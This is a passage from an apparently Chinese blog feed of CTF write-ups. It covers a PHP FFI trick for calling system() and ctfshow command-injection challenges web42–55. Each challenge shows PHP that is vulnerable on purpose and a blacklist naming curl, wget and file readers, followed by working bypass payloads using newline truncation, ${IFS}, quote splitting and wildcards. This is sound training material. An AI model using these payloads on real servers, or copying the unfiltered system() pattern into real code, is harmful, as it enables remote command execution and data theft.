这个写的挺全的</p></blockquote><p>还是先看文件名，发现有两个可疑文件：flag36x.tx t和 readflag<br>题里面提示了是php7.4。payload使用的是PHP 7.4+的FFI特性，即外部函数接口特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="comment">//创建一个system对象</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="comment">//没有回显的</span></span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="comment">//通过$ffi去调用system函数</span></span><br></pre></td></tr></table></figure><p>由于没有回显，所以这里要把结果写到1.txt里面。<br>PHP手册中对<code>FFI:cdef</code>原型的描述为<code>public static FFI::cdef(string $code = &quot;&quot;, ?string $lib = null)</code>，其中$code为一个字符串，包含常规C语言中的一系列声明，$lib为要加载和链接的共享库文件名称，如果省略lib，则平台将会尝试在全局范围内查找代码中声明的符号，其他系统将无法解析这些符号。<br><code>int system(const char *command);</code>即为C语言中system函数的定义，用于执行系统命令，也即在Linux平台下将/readflag &gt; 1.txt使用shell进行解析并执行，因此猜测readflag可能是一个可执行文件。<br>因此也可以用这种方法读取根目录下的文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;ls / &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681291412242-bd33651d-8eaf-4013-bf26-6ab8ad987bfd.png" alt="image.png"><br>最后的获取flag的payload如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$ffi</span> = FFI::<span class="title function_ invoke__">cdef</span>(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;<span class="title function_ invoke__">system</span>(<span class="variable">$a</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>后面几道题做起来真是抽象中的抽象，但是也给了我很多视角，感觉挺耳目一新的就是那个73里面对uaf的方法重写的想法挺新奇的，之前没有想过。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web42-57命令执行篇（二）</title>
      <link href="/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>/2023/03/30/web42-57%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AF%87%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在变量后面拼接了一堆字符串。在此之前，我们需要先思考这一串是什么东西。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;/dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span> </span><br></pre></td></tr></table></figure><p>就是让标准输出重定向到/dev/null中（丢弃标准输出），然后错误输出由于重用了标准输出的描述符，所以错误输出也被定向到了/dev/null中，错误输出同样也被丢弃了。执行了这条命令之后，该条shell命令将不会输出任何信息到控制台，也不会有任何信息输出到文件中。<br>因此这个也被成为数据黑洞（还是很形象的）。<br>这部分的bypass是双写，让后面的指令结果进入黑洞，但是保全前面的命令。<br>比如说：<code>?c=ls;ls</code>，这就出现了运行结果。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888044280-4977aed2-5019-4f9a-b9f3-7a5f88a08b5d.png" alt="image.png"><br>于是payload也就很容易得到了：<code>?c=tac flag.php;ls</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1678888113737-36ea4c05-f999-4289-b19f-55a8710fc053.png" alt="image.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>当然直接使用<code>%0a</code>截断也可以，比如：<code>tac f*%0a</code></p><h2 id="从重定向到黑洞（-gt-dev-null-2-gt-amp-1）"><a href="#从重定向到黑洞（-gt-dev-null-2-gt-amp-1）" class="headerlink" title="从重定向到黑洞（&gt;/dev/null 2&gt;&amp;1）"></a>从重定向到黑洞（&gt;/dev/null 2&gt;&amp;1）</h2><blockquote><p><a href="https://www.cnblogs.com/kexianting/p/11630085.html">https://www.cnblogs.com/kexianting/p/11630085.html</a>（建议忘了看这个，写的很全）</p></blockquote><p>但是我们不能只知道这个东西是是黑洞，我们也要明白其中的原理。<br>容易看出，上面的语句应该是分成两段，前一段是：<code>&gt;/dev/null</code>后一段是：<code>2&gt;&amp;1</code><br>前者的含义是将输出结果定向到<code>&gt;/dev/null</code>，而这个地址表示的是linux的空设备，因此会将运行结果消灭。<br>而后者简单解释就是将正确和错误两个输出绑定到一起，都输出到同一个地方。（其中1指的是标准输出，2指的是错误输出，详细的看参考文章）。</p><h1 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了分号，不能用上一题的方法绕过了，但是可以使用<code>%0a</code>（回车）截断。<br>payload：<code>tac f*%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679064061206-b7272e00-d5ee-46c4-bb3f-60feec9e1b6b.png" alt="image.png"></p><h1 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">  <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/;|cat|flag/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac f*%0a</code></p><h1 id="web45-IFS绕过原理解析"><a href="#web45-IFS绕过原理解析" class="headerlink" title="web45 IFS绕过原理解析"></a>web45 IFS绕过原理解析</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>多了一个空格过滤，payload中简单加一个<code>$&#123;IFS&#125;</code>即可绕过。<br><code>?c=tac$&#123;IFS&#125;f*%0a</code></p><h2 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h2><blockquote><p><a href="https://blog.csdn.net/qq_54727981/article/details/125936528">https://blog.csdn.net/qq_54727981/article/details/125936528</a></p></blockquote><p>一直使用IFS来绕过，但是一直不知道什么意思，了解了一下：<br><em>$IFS 是一种 set 变量，当 shell 处理”命令替换”和”参数替换”时，shell 根据 IFS 的值，默认是 space,tab, newline 即空格，制表符，空行来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。<br>直接用$IFS的话，会认为解析没结束，会把后面的也当做参数解析，比如cat$IFSflag.php，会把IFSflag一起当变量解析。这时候需要在$IFS后面进行截断，使解析为空，结束 $IFS，正常执行后面的内容。</em></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat$IFS$<span class="number">1</span>flag.php<span class="comment">//使用特殊变量</span></span><br><span class="line">cat$&#123;IFS&#125;flag.php<span class="comment">//使用&#123;&#125;</span></span><br><span class="line">cat<span class="variable">$IFS</span><span class="string">&#x27;f&#x27;</span>lag.php<span class="comment">//使用引号</span></span><br><span class="line">cat<span class="variable">$IFS</span>\flag.php<span class="comment">//使用转义符</span></span><br><span class="line">cat<span class="variable">$IFS</span>?lag.php<span class="comment">//使用通配符</span></span><br></pre></td></tr></table></figure><h1 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格过滤还过滤了美元符号，用通配符<code>&lt;</code>绕过即可。flag和*过滤用单双引号绕过即可。<br><code>?c=tac&lt;&gt;&#39;f&#39;lag.php%0a</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679066076057-af02fc4a-8fcb-4ffd-92d2-a0a618e12b51.png" alt="image.png"></p><h1 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code><br>hint中给的方法是这种：<code>nl&lt;fla&#39;&#39;g.php||</code><br>看来管道符也可以截断，但是尝试将管道符换成&amp;却不行。可能这里截断的是文本而不是命令。</p><h1 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>竟然还没有过滤tac<br><code>?c=tac&lt;&#39;f&#39;lag.php%0a</code></p><h1 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code>不让用%0a，就用刚刚在hint中学到的双管道符隔断。</p><h1 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=tac&lt;f&#39;&#39;lag.php||</code><br>过滤中出现了很有意思的东西：<code>\x09 和\x26</code>，\x表示后面两位用十六进制来表示，则前面两国的代表ascii码为9和26的字符<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067645206-6016ee60-ecf7-444c-b21f-8aa772e86e2d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679067671699-e7dac3c6-fcc4-4c21-abc4-ec77d4cec155.png" alt="image.png"><br>注意是十六进制，不是十进制。</p><h1 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这回把tac过滤了，但是还是有能用的，比如说nl<br><code>?c=nl&lt;&#39;f&#39;lag.php||</code>，php代码需要打开f12查看。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679068035543-96675332-0e1e-4049-a48b-92fc65af02f3.png" alt="image.png"></p><h1 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把通配符的&lt;&gt;过滤了，找了半天还有什么办法能够绕过空额过滤，看hint才发现又可以使用$了…<br><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php||</code></p><h1 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(isset($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        echo($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        echo <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        echo <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>?c=nl$&#123;IFS&#125;fla&#39;&#39;g.php</code>但实际上前面过滤的字符也可以通过单引号引用绕过过滤，比如hint中的payload如下：<code>c&#39;&#39;at$&#123;IFS&#125;fla&#39;&#39;g.p&#39;&#39;hp</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679585398882-ec3be4e8-ae77-465f-a040-def087976b2b.png" alt="image.png"></p><h1 id="web54-通配符中问号的使用"><a href="#web54-通配符中问号的使用" class="headerlink" title="web54 通配符中问号的使用"></a>web54 通配符中问号的使用</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一种方法：<code>mv$&#123;IFS&#125;fla?.php$&#123;IFS&#125;a.txt</code>，因为没有禁用ls，因此知道文件名，因此可以使用mv来重命名文件。然后打开即可，打开有几种不同的方法，比如说<code>?c=uniq$&#123;IFS&#125;a.txt</code>，但是flag在源代码中，需要f12查看；或者用<code>?c=rev$&#123;IFS&#125;a.txt</code>反转输出文件，这种得到的flag是行反转的，需要调转回来：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1679587103373-ae7c080f-73d5-4fb5-b617-0b10124e9840.png" alt="image.png"><br>除此之外，还有一种直接一步完成的方法。<code>c=uniq$&#123;IFS&#125;f???.php</code>，这里通过使用？通配符来一步绕过过滤，其实对名称的过滤大部分就是对linux通配符的考察，需要我们一点点加强功底。</p><h2 id="通配符？和-的区别"><a href="#通配符？和-的区别" class="headerlink" title="通配符？和*的区别"></a>通配符？和*的区别</h2><p>*可以替代一个或多个字符，而？只能替代一个字符。<br>比如：</p><ul><li>如果正在查找以AEW开头的一个文件，但不记得文件名其余部分，可以输入AEW*，查找以AEW开头的所有文件类型的文件，如AEWT.txt、AEWU.EXE、AEWI.dll等。</li><li>如果输入love?，查找以love开头的一个字符结尾文件类型的文件，如lovey、lovei等。要缩小范围可以输入love?.doc，查找以love开头的一个字符结尾文件类型并.doc为扩展名的文件如lovey.doc、loveh.doc。</li></ul><h1 id="web55-通配符中问号使用plus版"><a href="#web55-通配符中问号使用plus版" class="headerlink" title="web55 通配符中问号使用plus版"></a>web55 通配符中问号使用plus版</h1><blockquote><p><a href="https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc">https://blog.csdn.net/xiaolong22333/article/details/109480420?spm=a2c6h.12873639.article-detail.4.6ced5331lGc8cc</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚看到这个题的第一想法是使用自增，但是发现吧分号过滤了，用不了。看了一下wp，发现了几种比较牛逼的解法。</p><h2 id="方法一-使用bin目录下的base64命令-来代替字符"><a 